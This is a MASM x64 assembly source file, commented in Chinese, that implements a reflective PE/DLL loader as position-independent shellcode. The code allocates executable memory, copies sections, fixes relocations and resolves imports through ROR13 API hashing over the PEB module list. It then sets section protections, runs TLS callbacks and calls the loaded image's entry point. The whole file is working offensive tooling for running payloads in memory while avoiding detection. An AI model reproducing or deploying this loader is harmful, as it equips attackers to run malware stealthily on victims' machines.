;----------------------------------------------------------------------------------
; Author: oneday
; Language: MASM
; Details: front-style RDI shellcode
;----------------------------------------------------------------------------------

.code

main proc
	
;-------------------------------------------------------------------
; [rbp+8] = 旧DOS头地址（基址）
; [rbp+16] = 新DOS头地址（基址）
; [rbp+24] = 新NT头地址
; LoadPEIntoMemory64
;-------------------------------------------------------------------
	push rax												; 对齐

    ; 获取 SizeOfImage
    mov rax, [rbp+8]										; 旧DOS头地址
    mov r12d, dword ptr [rax+3Ch]							; PE头RVA（原文件）
    add r12, rax											; r12 = 原内存中的NT头地址
    mov edx, dword ptr [r12+50h]							; SizeOfImage（64位）

    ; 调用 VirtualAlloc 分配内存
    xor rcx, rcx											; lpAddress = NULL
															; rdx = SizeOfImage
    mov r8d, 1000h											; MEM_COMMIT
    mov r9d, 40h											; PAGE_EXECUTE_READWRITE
    mov r10, 0FBFA86AFh										; VirtualAlloc哈希
    call GetProcAddressByHash
	add rsp,32												; 清理影子空间
    mov qword ptr [rbp+16], rax								; 保存新基址到[rbp+16]

    ; 复制NT头
    mov ecx, dword ptr [r12+54h]							; SizeOfHeaders
    mov rsi, [rbp+8]										; 旧DOS头地址
    mov rdi, rax											; 新基址
    rep movsb

	; 重定向NT头地址
	mov r12d, dword ptr [rax+3ch]							; 获取pe头RVA
	add r12, rax											; r12=新NT头地址
	mov [rbp+24],r12										; 新NT地址存储在[rbp+24]

    ; 遍历节表
    movzx eax, word ptr [r12+14h]							; SizeOfOptionalHeader
    lea r14, [r12+rax+18h]									; 节表起始地址
    movzx r13d, word ptr [r12+6]							; 节区数量

next_section:
    cmp dword ptr [r14+10h], 0								; SizeOfRawData
    je get_next_section										; SizeOfRawData为0，则复制下一个节

copy_section_data:
    mov esi, [r14+14h]										; PointerToRawData
    add rsi, [rbp+8]										; 源地址
    mov edi, [r14+0Ch]										; VirtualAddress
    add rdi, [rbp+16]										; 目标地址
    mov ecx, [r14+10h]										; SizeOfRawData
    rep movsb

get_next_section:
    add r14, 28h											; 一个节头28h
    dec r13d												; 计数器减1
    jnz next_section										; 如果计数器减为0，则结束

;-------------------------------------------------------------------
; [rbp+8] = 旧DOS头地址（基址）
; [rbp+16] = 新DOS头地址（基址）
; [rbp+24] = 新NT头地址
; FixRelocations
;-------------------------------------------------------------------
    ; 获取 Delta = NewBase - OldBase
    mov rax,[rbp+24]										; PE头地址
    mov rbx,[rbp+16]										; NewBase
    sub rbx,[rax+30h]										; OldBase (ImageBase)
    push rbx												; 保存 Delta

    ; 定位重定位目录 (DataDirectory[5])和重定位表
    lea rdx, [rax + 88h + 5*8]								; 重定位目录
    mov edx, dword ptr [rdx]								; RVA of Reloc Table
    add rdx, [rbp+16]										; 转换为实际地址: NewBase + RVA, rdx = 重定位表入口点

next_block:
    mov eax, dword ptr [rdx]								; VirtualAddress
	test eax,eax											; 如果重定位块的VirtualAddress
	jz reloc_done
    mov ecx, dword ptr [rdx+4]								; SizeOfBlock
    lea rsi, [rdx + 8]										; 条目数据起始地址 = rdx + 8
	add rcx,rdx												; 边界值
next_entry:
    movzx eax, word ptr [rsi]								; 读取条目
    mov ebx, eax					 
    shr ebx, 12												; 类型 (高4位)
    cmp bx, 0Ah												; IMAGE_REL_BASED_DIR64
    jne get_next_entry

    ; 计算目标地址: NewBase + VirtualAddress + Offset
    and eax, 0FFFh											; Offset (低12位)
    add eax, dword ptr [rdx]								; VirtualAddress (当前块)
    add rax, [rbp+16]										; NewBase

    ; 修正地址
    mov rbx, [rax]											; 读取原值
    add rbx, [rsp]											; 修正后的值 = 原值 + 获取栈上的Delta
    mov [rax], rbx											; 修正后的值填入原处

get_next_entry:
    add rsi, 2												; 没有到边界，就移动到下一个重定位项，一个重定位项占16位
	cmp rcx,rsi												; 判断是否到达了边界值
	je get_next_block										; 如果到了边界值就下一个重定位块
    jmp next_entry					 

get_next_block:
    mov eax, dword ptr [rdx+4]								; 获取当前块大小
    add rdx, rax											; 移动到下一重定位块
    jmp next_block

reloc_done:
    pop rbx													; clear Delta

;-------------------------------------------------------------------
; [rbp+8] = 旧DOS头地址（基址）
; [rbp+16] = 新DOS头地址（基址）
; [rbp+24] = 新NT头地址
; ParseImportTable
;-------------------------------------------------------------------

	; 获取导入目录
	mov rax,[rbp+24]										; 获取NT头地址
	mov eax,dword ptr [rax + 8 + 88h]						; 获取导入表RVA
	mov r12,qword ptr [rbp+16]								; 获取基址
	add r12,rax												; r12 = 获取导入表的VA

	; 解析单个DLL的导入函数
next_dll:
	cmp dword ptr [r12], 0									; 判断导入描述符是否结束（全零）
	je loop_dll_end

	; 处理当前DLL的导入项
	mov ecx, dword ptr [r12 + 0ch]							; DLLname RVA
	add rcx,[rbp + 16]										; DLLname VA 可以动态调式看看
	mov r10,56590AE9h										; kernel32.dll+LoadLibraryA的哈希值
	call GetProcAddressByHash								; 获取模块
	add rsp,32												; 清除影子空间
	xchg rbx,rax											; rbx = 加载dll的模块基址

	mov esi,dword ptr [r12]									; INT RVA
	add rsi,qword ptr [rbp+16]								; INT VA
	mov edi,dword ptr [r12+16]								; IAT RVA
	add rdi,qword ptr [rbp+16]								; IAT VA

next_thunk:
	cmp dword ptr [rsi], 0									; 检查当前导入名称表（INT）条目是否为0
	je get_next_dll											; 全零表示结束

	mov rax,qword ptr [rsi]									; 获取INT条目值
	mov rdx,rax												; 保存
	test rax,rax											; 判断是按名称导入还是按序号导入
	js import_by_ordinal									; SF=1，名称导入

	; 按名称导入
import_by_Name:
	mov rcx,rbx												; hModule
	add rdx,qword ptr [rbp + 16]							; 获取IMAGE_IMPORT_BY_NAME结构体
	add rdx,2												; 跳过Hint字段
	mov r10,0E658B905h										; kernel32.dll+GetProcAddress hash
	call GetProcAddressByHash
	jmp get_next_thunk

	; 按序号导入
import_by_ordinal:
	and rdx, 0FFFFh											; 获取序号				
	mov rcx,rbx												; hModule
	mov r10,0E658B905h										; kernel32.dll+GetProcAddress hash
	call GetProcAddressByHash
	
get_next_thunk:
	add rsp,32												; 恢复到调用前的状态
	mov [rdi],rax											; 函数地址填入到IAT相应的位置
	add rsi,8												; 移动到下一个INT条目
	add rdi,8												; 移动到下一个IAT条目
	jmp next_thunk

get_next_dll:
	add r12,14h												; 一个descriptor的大小为14h
	jmp next_dll											; 处理下一个descriptor

loop_dll_end:												; 执行后续代码

;-------------------------------------------------------------------
; [rbp+8] = 旧DOS头地址（基址）
; [rbp+16] = 新DOS头地址（基址）
; [rbp+24] = 新NT头地址
; AdjustMemProtect
;-------------------------------------------------------------------

	; 获取节表信息
	mov rbx,[rbp+24]
	movzx eax,word ptr [rbx+14h]							; FileHeader.SizeOfOptionalHeader
	lea r12,[rbx+rax+18h]									; r12 = pSectionHeader 
	movzx r13d,word ptr [rbx+6]								; SectionNumber

next_section1:
	; 在这里修复各节属性
	mov eax,dword ptr [r12+24h]								; Characteristics
	and eax,0E0000000h										; 只保留29、30、31位（MEM_WRITE/MEM_READ/MEM_EXECUTE），其余位清零
	shr eax,29												; 右移29位

	call Get_Protect							

	; 内存保护常量表（字节数组）
ProtectionTable:
    db  01h     ; [0] PAGE_NOACCESS
    db  10h     ; [1] PAGE_EXECUTE
    db  02h     ; [2] PAGE_READONLY
    db  20h     ; [3] PAGE_EXECUTE_READ
    db  08h     ; [4] PAGE_WRITECOPY
    db  80h     ; [5] PAGE_EXECUTE_WRITECOPY
    db  04h     ; [6] PAGE_READWRITE
    db  40h     ; [7] PAGE_EXECUTE_READWRITE

Get_Protect:
	pop rsi
	movzx r8d, byte ptr [rsi + rax]

SetMemProtect:
	mov ecx,dword ptr [r12 + 0Ch]			
	add rcx,[rbp+16]										; lpAddress = 节的起始地址
	mov edx,[r12 + 10h]										; dwSize = 节的大小
	sub rsp,8
															; flNewProtect
	mov r9,rsp												; lpflOldProtect 
	mov r10,0E3918276h										; kernel32 + VirtualProtect hash
	call GetProcAddressByHash
	add rsp,40												; 清除32字节影子空间+8字节的lpflOldProtect
	
get_next_section1:
	add r12, 28h											; 下一个节头，一个节头28h字节
	dec r13d												; 节头数减一
	test r13d,r13d											; 检查是否为0
	jnz next_section1										; 如果节头数为0，则结束循环

;-------------------------------------------------------------------
; [rbp+8] = 旧DOS头地址（基址）
; [rbp+16] = 新DOS头地址（基址）
; [rbp+24] = 新NT头地址
; ExecuteTLSCallbacks
;-------------------------------------------------------------------

	mov rax,[rbp+24]										; 新NT头
	lea rax,[rax + 88h + 72]								; TLS 数据目录项地址	

	; 检查TLS目录大小
	cmp dword ptr [rax+4],0									; 比较 TLS 目录大小字段 
	je entry												; 如果大小为0，跳转到入口点 (无TLS回调)	

	; 获取TLS目录VA (tlsDir)
	mov edx,dword ptr [rax]									; TLS目录的RVA
	add rdx,[rbp+16]										; TLS目录的VA

	; 获取回调函数数组 (callback)
	mov rdi,[rdx+3*8]										; 回调函数数组的首地址AddressOfCallBacks  

next_tlscallback:	
	cmp qword ptr [rdi],0									; 检查当前回调函数指针是否为NULL
	je entry												; 若为NULL（数组结束），跳转到入口点
	
	mov rax,[rdi]											; 当前回调函数的地址
	mov rcx,[rbp+16]										; 参数1: 模块基址
	mov edx,1												; 参数2: DLL_PROCESS_ATTACH (值=1)
	xor r8d,r8d												; R8  = 参数3: NULL
	call rax												; 调用TLS回调函数

get_next_tlscallback:
	add rdi,8												; 移动到下一个函数指针
	jmp next_tlscallback									; 继续循环
	

;-------------------------------------------------------------------
; 根据EXE或DLL相应的特征调用入口点
; GoToEntry
;-------------------------------------------------------------------
entry:
	mov  rsi, [rbp+24]					; 获取PE头地址
	mov  ax, word ptr [rsi+16h]			; 读取Characteristics字段
	test ax, 2000h						; 检查是否为DLL (0x2000)
	jz   is_exe							; 非DLL则跳转EXE处理

	sub rsp,32
	mov ebx,dword ptr [rsi + 28h]		; 调用DLL入口点 RVA
	add rbx,[rbp+16]					; 调用DLL入口点 VA
	mov rcx,[rbp+16]
	mov rdx,1
	xor r8d,r8d
	call rbx

	add rsp,40
	ret

is_exe:
	mov ebx,dword ptr [rsi + 28h]		; 调用EXE入口点 RVA
	add rbx,[rbp+16]					; 调用EXE入口点 VA
	call rbx
	pop rax								; 清除对齐值
	ret
	
main endp

GetProcAddressByHash proc
	
	
	; 1. 保存前4个参数到栈上，并保存rsi和r12的值
	push r9
	push r8
	push rdx
	push rcx
	push rsi
	push r12

	; 2. 获取 InMemoryOrderModuleList 模块链表的第一个模块结点
	xor rdx,rdx												; 清零
	mov rdx,gs:[rdx+60h]									; 通过GS段寄存器获取PEB地址（TEB偏移0x60处）
	mov rdx,[rdx+18h]										; PEB->Ldr
	mov rdx,[rdx+20h]										; 第一个模块节点，也是链表InMemoryOrderModuleList的首地址

	;3.模块遍历
next_mod:
	mov rsi,[rdx+50h]                 						; 模块名称
	movzx rcx,word ptr [rdx+48h]	 						; 模块名称长度
	xor r8,r8                         						; 存储接下来要计算的hash

	; 4.计算模块hash
loop_modname:
	xor rax, rax											; 清零EAX，准备处理字符
	lodsb													; 从rSI加载一个字节到AL（自动递增rSI）
	cmp al,'a'												; 比较当前字符的ASCII值是否小于小写字母'a'(0x61)
	jl not_lowercase										; 如果字符 < 'a'，说明不是小写字母，跳转不处理
	sub al, 20h												; 若字符在'a'-'z'范围内，通过减0x20转换为大写字母（'A'-'Z'）
not_lowercase:
	ror r8d,0dh												; 对R8的低32位进行循环右移13位，不影响高32位
	add r8d,eax												; 将当前字符的ASCII值（已大写化）累加到哈希值
	dec ecx													; 字符计数器ECX减1
	jnz loop_modname										; 继续循环处理下一个字符，直到ECX减至0
	push rdx												; 将当前模块链表节点地址压栈    
	push r8													; 将计算完成的哈希值压栈存储hash值

	; 5.获取导出表
	mov rdx, [rdx+20h]										; 获取模块基址
	mov eax, dword ptr [rdx+3ch]							; 读取PE头的RVA
	add rax, rdx											; PE头VA
	cmp word ptr [rax+18h],20Bh								; 检查是否为PE64文件
	jne get_next_mod1										; 不是就下一个模块
	mov eax, dword ptr [rax+88h]							; 获取导出表的RVA
	test rax, rax											; 检查该模块是否有导出函数
	jz get_next_mod1										; 没有就下一个模块
	add rax, rdx											; 获取导出表的VA
	push rax												; 存储导出表的地址
	mov ecx, dword ptr [rax+18h]							; 按名称导出的函数数量
	mov r9d, dword ptr [rax+20h]							; 函数名称字符串地址数组的RVA
	add r9, rdx												; 函数名称字符串地址数组的VA

	; 6.获取函数名	
get_next_func:	
	test rcx, rcx											; 检查按名称导出的函数数量是否为0
	jz get_next_mod											; 若所有函数已处理完，跳转至下一个模块遍历
	dec rcx													; 函数计数器递减（从后向前遍历函数名数组）
	mov esi, dword ptr [r9+rcx*4]							; 从末尾往前遍历，一个函数名RVA占4字节
	add rsi, rdx											; 函数名RVA
	xor r8, r8												; 存储接下来的函数名哈希

	; 7.计算模块 hash + 函数 hash之和
loop_funcname: 
	xor rax, rax											; 清零EAX，准备处理字符
	lodsb													; 从rsi加载一个字节到al，rsi自增1
	test al, al
	jz end_funcname
	ror r8d,0dh												; 对当前哈希值（r8d）循环右移13位
	add r8d,eax												; 将当前字符的ASCII值（al）累加到哈希值（r8d）
	jmp loop_funcname										; 若字符非0，继续循环处理下一个字符

end_funcname:
	add r8,[rsp+8]											; 将之前压栈的模块哈希值（位于栈顶+8）加到当前函数哈希
	cmp r8d,r10d											; r10存储目标hash
	jnz get_next_func

	; 8.获取目标函数指针
	pop rax													; 获取之前存放的当前模块的导出表地址
	mov r9d, dword ptr [rax+24h]							; 获取序号表（AddressOfNameOrdinals）的 RVA
	add r9, rdx												; 序号表起始地址
	mov cx, [r9+2*rcx]										; 从序号表中获取目标函数的导出索引
	mov r9d, dword ptr [rax+1ch]							; 获取函数地址表（AddressOfFunctions）的 RVA
	add r9, rdx												; AddressOfFunctions数组的首地址
	mov eax, dword ptr [r9+4*rcx]							; 获取目标函数指针的RVA
	add rax, rdx											; 获取目标函数指针的地址

finish:
	pop r8													; 清除当前模块hash
	pop r8													; 清除当前链表的位置
	pop r12
	pop rsi													; 恢复RSI
	pop rcx													; 恢复第一个参数
	pop rdx													; 恢复第二个参数
	pop r8													; 恢复第三个参数
	pop r9													; 恢复第四个参数
	pop r10													; 将返回地址地址存储到r10中
	sub rsp, 20h											; 给前4个参数预留 4*8=32（20h）的影子空间
	push r10												; 返回地址
	jmp rax													; 调用目标函数

get_next_mod:                 
	pop rax                         						; 弹出栈中保存的导出表地址
get_next_mod1:
	pop r8                         				 			; 弹出之前压栈的计算出来的模块哈希值
	pop rdx                         						; 弹出之前存储在当前模块在链表中的位置
	mov rdx, [rdx]                  						; 获取链表的下一个模块节点（FLINK）
	jmp next_mod                    						; 跳转回模块遍历循环

GetProcAddressByHash endp

end